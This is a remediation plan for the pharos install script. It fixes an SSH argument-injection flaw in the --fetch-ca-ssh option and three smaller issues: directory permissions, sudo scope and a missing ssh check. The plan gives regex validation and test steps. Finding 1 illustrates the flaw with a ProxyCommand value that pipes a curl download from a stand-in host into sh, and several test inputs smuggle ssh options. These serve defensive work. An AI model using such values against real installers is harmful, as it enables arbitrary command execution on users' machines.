/* ========================================================================
 * Project: pharos
 * Component: Documentation & UX
 * File: pulse-ca-fetch-hardening-plan.md
 * Author: Richard D. (https://github.com/iamrichardd)
 * License: AGPL-3.0 (See LICENSE file for details)
 * * Purpose (The "Why"):
 * Remediation plan for four findings from the panel's DevSecOps review of
 * the Gap 1 (--fetch-ca-ssh) change: an SSH argument-injection bug (HIGH),
 * a cert-directory permissions inconsistency (MEDIUM), missing sudoers
 * scoping guidance (MEDIUM), and a missing `ssh` binary dependency check
 * (LOW).
 * * Traceability:
 * Related to the node-install UX panel investigation (2026-08-02/03).
 * ======================================================================== */

# Plan: harden `--fetch-ca-ssh` against argument injection + 3 smaller findings

## Finding 1 (HIGH, DevSecOps): SSH argument injection via unvalidated target

**Current code** (`scripts/install.sh`, `main()`, re-read fresh this session):

```bash
    local target=${1:-"node"}
    local host_override=${2:-}
    local fetch_ca_ssh_target=""

    if [[ $# -gt 2 ]]; then
        shift 2
        while [[ $# -gt 0 ]]; do
            case "$1" in
                --fetch-ca-ssh)
                    [[ -n "${2:-}" ]] || error "--fetch-ca-ssh requires a [user@]host argument."
                    fetch_ca_ssh_target="$2"
                    shift 2
                    ;;
                *)
                    error "Unknown argument: $1"
                    ;;
            esac
        done
    fi
```

`fetch_ca_ssh_target` is accepted verbatim and later passed straight to `ssh` as a single argv
token (`fetch_ca_via_ssh`, in `scripts/install.sh`):

```bash
    if ! fetched="$(ssh -o BatchMode=yes -o ConnectTimeout=10 "${ssh_target}" \
        "sudo cat ${cert_dir}/pharos-ca.crt" 2>/dev/null)" || [[ -z "${fetched}" ]]; then
```

**The bug**: shell quoting prevents word-splitting, but does *not* prevent `ssh`'s own option
parser from treating a value starting with `-` as a flag rather than a hostname — this is
argument injection, not shell injection, and quoting does nothing to stop it. A value like
`-oProxyCommand=sh -c "curl evil.example/x|sh"` passed as the `--fetch-ca-ssh` argument achieves
arbitrary command execution as the installing user.

This inconsistent with the rest of this exact file: both `host_arg` (in `install_pulse`) and
`hostname_arg` (in `install_server`) are validated against a strict regex before use — this new
flag skipped that established pattern.

**The fix** — add validation immediately after parsing, inside the same `case` branch (or right
after the `while` loop, whichever reads more naturally — placing it right after the loop is
simpler since it's a one-time check, not per-argument):

```bash
    if [[ -n "${fetch_ca_ssh_target}" ]] && ! [[ "${fetch_ca_ssh_target}" =~ ^([A-Za-z0-9][A-Za-z0-9_.-]*@)?[A-Za-z0-9][A-Za-z0-9.-]*$ ]]; then
        error "Invalid --fetch-ca-ssh target: '${fetch_ca_ssh_target}'. Expected [user@]host, e.g. admin@192.168.1.5."
    fi
```

This structurally cannot match a value starting with `-` (the first character class in both the
optional user part and the mandatory host part is `[A-Za-z0-9]`, never a hyphen), while still
accepting realistic real-world values: `admin@192.168.1.5`, `pi@homelab.local`,
`root@my-hub-01.internal`, or a bare `192.168.1.5`/`my-hub`.

## Finding 2 (MEDIUM, DevSecOps): cert directory permissions drift

**Current code** (`fetch_ca_via_ssh`, `scripts/install.sh`):

```bash
fetch_ca_via_ssh() {
    local ssh_target=$1
    local cert_dir="${PHAROS_DIR}/certs"

    log "Attempting to fetch hub CA cert via SSH from ${ssh_target}..."
    ${SUDO} mkdir -p "${cert_dir}"
```

`setup_pki` (existing, unmodified code) creates the same directory with `chown root:pharos` +
`chmod 750` when it's the one creating it first. `fetch_ca_via_ssh` doesn't match that — on a bare
node install (the common case this feature targets, since `setup_pki` is never called there),
`${cert_dir}` ends up with whatever default ownership/mode `mkdir` produces instead of this
codebase's established convention.

**The fix** — match `setup_pki`'s exact ownership/mode calls right after the `mkdir -p`:

```bash
    ${SUDO} mkdir -p "${cert_dir}"
    ${SUDO} chown root:pharos "${cert_dir}"
    ${SUDO} chmod 750 "${cert_dir}"
```

## Finding 3 (MEDIUM, DevSecOps): no guidance against overly-broad sudo

The non-interactive `BatchMode=yes` fetch requires the hub-side account to have passwordless sudo
for at least reading that one file. Nothing currently tells the operator to scope that grant
narrowly, so the path of least resistance is a blanket `NOPASSWD: ALL` — broader than this feature
needs.

**The fix** — add one line to the existing failure-path `warn` message in `fetch_ca_via_ssh` (the
first one, for the SSH/sudo failure case specifically — not the invalid-certificate one, since
that failure mode isn't about sudo scope):

```bash
    if ! fetched="$(ssh -o BatchMode=yes -o ConnectTimeout=10 "${ssh_target}" \
        "sudo cat ${cert_dir}/pharos-ca.crt" 2>/dev/null)" || [[ -z "${fetched}" ]]; then
        warn "Could not fetch hub CA cert via SSH from ${ssh_target} (no passwordless SSH/sudo, or the file doesn't exist there) — falling back to manual TLS trust instructions below."
        warn "If you want --fetch-ca-ssh to work, grant narrowly-scoped passwordless sudo on the hub, e.g.: echo '<hub-user> ALL=(ALL) NOPASSWD: /usr/bin/cat ${cert_dir}/pharos-ca.crt' | sudo tee /etc/sudoers.d/pharos-ca-fetch — avoid a blanket 'NOPASSWD: ALL' just for this."
        return 1
    fi
```

## Finding 4 (LOW, DevSecOps + Ubuntu Specialist): no `ssh` binary check

If `ssh` isn't installed (plausible on a minimal image), `fetch_ca_via_ssh` currently hits a raw
`ssh: command not found`-style failure instead of the clean `warn`-and-fallback the rest of the
function is designed to produce.

**The fix** — add a guard at the very top of `fetch_ca_via_ssh`, before doing anything else:

```bash
fetch_ca_via_ssh() {
    local ssh_target=$1
    local cert_dir="${PHAROS_DIR}/certs"

    if ! command -v ssh >/dev/null 2>&1; then
        warn "ssh is not installed on this machine — cannot use --fetch-ca-ssh. Falling back to manual TLS trust instructions below."
        return 1
    fi

    log "Attempting to fetch hub CA cert via SSH from ${ssh_target}..."
    ${SUDO} mkdir -p "${cert_dir}"
    ...
```

## Non-goals (do not touch)

- **Do not** touch `crates/pharos-pulse/src/main.rs` or `crates/pharos-pulse/Cargo.toml` at all —
  Gap 2 and Gap 3's fixes already live there, verified working, unrelated to this remediation.
  **This is the single most important non-goal in this plan** — a previous builder run on an
  unrelated task already destroyed uncommitted work in a shared file once this session; do not
  repeat that. If you find yourself about to run `git checkout`, `git reset`, or `git stash` on
  any file, STOP — that is never necessary for this change, which only adds a few validation/guard
  lines to `scripts/install.sh`. Confirm before finishing that `git diff --stat` still shows
  changes in all of: `scripts/install.sh`, `crates/pharos-pulse/src/main.rs`,
  `crates/pharos-pulse/Cargo.toml`, and `Cargo.lock` — if any of those disappear from the diff,
  something was wrongly reverted; restore it before reporting completion.
- **Do not** change the shape of the `--fetch-ca-ssh` flag itself (still `[user@]host`, no port
  support, no other new flags).
- **Do not** add real dependency-auto-install logic for `ssh` (unlike `ensure_openssl`'s
  auto-install pattern) — just detect its absence and fail cleanly to the existing manual
  fallback. Auto-installing `openssh-client` is a bigger, separate decision not asked for here.
- **Do not** touch `install_server`/`setup_pki` itself — only mirror its ownership/mode values
  inside `fetch_ca_via_ssh`, don't refactor `setup_pki` to share code with it.

## Verification steps (concrete)

This is a pure bash change — same verification approach as the original Gap 1 plan applies (never
`source scripts/install.sh` directly; extract functions with
`sed -n '/^funcname()/,/^}/p' scripts/install.sh` into a throwaway harness with stubbed
`log()`/`warn()`/`error()`/`SUDO=""`/`PHAROS_DIR=<temp dir>`).

1. **Injection-regex test** — confirm the new validation regex:
   - Accepts: `admin@192.168.1.5`, `pi@homelab.local`, `root@my-hub-01.internal`,
     `192.168.1.5`, `my-hub`.
   - Rejects (must `error` / exit non-zero): `-oProxyCommand=x`, `--evil`, `-x`,
     `admin@-oProxyCommand=x` (a value where only the *host* part after `@` starts with `-` —
     make sure the regex catches this too, not just a bare leading dash on the whole string).
2. **Directory ownership test** — run `fetch_ca_via_ssh` (extracted, stubbed `PHAROS_DIR` to a
   fresh temp dir that doesn't exist yet) against a real successful SSH target (reuse the same
   disposable-Podman-container-with-sshd approach from the original Gap 1 live verification) and
   confirm the resulting `${cert_dir}` has the same owner/mode `setup_pki` would produce
   (`root:pharos`, `750`) — note this requires running the stub with real `sudo`/root context for
   `chown root:pharos` to actually succeed; if testing as a non-root user, verify the exact
   `chown`/`chmod` commands were *issued* (e.g. by stubbing `SUDO="echo would-run:"` and checking
   the captured command strings) rather than requiring the test itself to run as root.
3. **Missing-`ssh`-binary test** — extract `fetch_ca_via_ssh`, temporarily shadow `command` or
   manipulate `PATH` so `command -v ssh` fails, confirm it returns 1 with the new warn message and
   never attempts the actual `ssh` invocation.
4. **Sudoers-guidance message test** — confirm the new second `warn` line appears in the
   SSH/sudo-failure branch's output (can verify by re-running the exact fallback-case test from
   the original Gap 1 verification and checking the captured output now contains both warn lines).
5. **Full regression check**: re-run the original Gap 1 argument-parsing tests (all 7 forms
   verified in the previous round) to confirm none of them changed behavior, and the real
   SSH-fetch live test (disposable Podman container, real sshd, real cert, real fingerprint match)
   still succeeds end-to-end with the new ownership/mode calls added.

## Report back

State clearly: the exact diff (should be entirely within `scripts/install.sh` — no other file
touched), each of the 4 findings' test results, and **explicit confirmation via `git diff --stat`
that `crates/pharos-pulse/src/main.rs`, `crates/pharos-pulse/Cargo.toml`, and `Cargo.lock` still
show their prior changes intact** (this is the specific check that would have caught last time's
incident). Do not commit or push — this repo requires explicit instruction for that, every time.
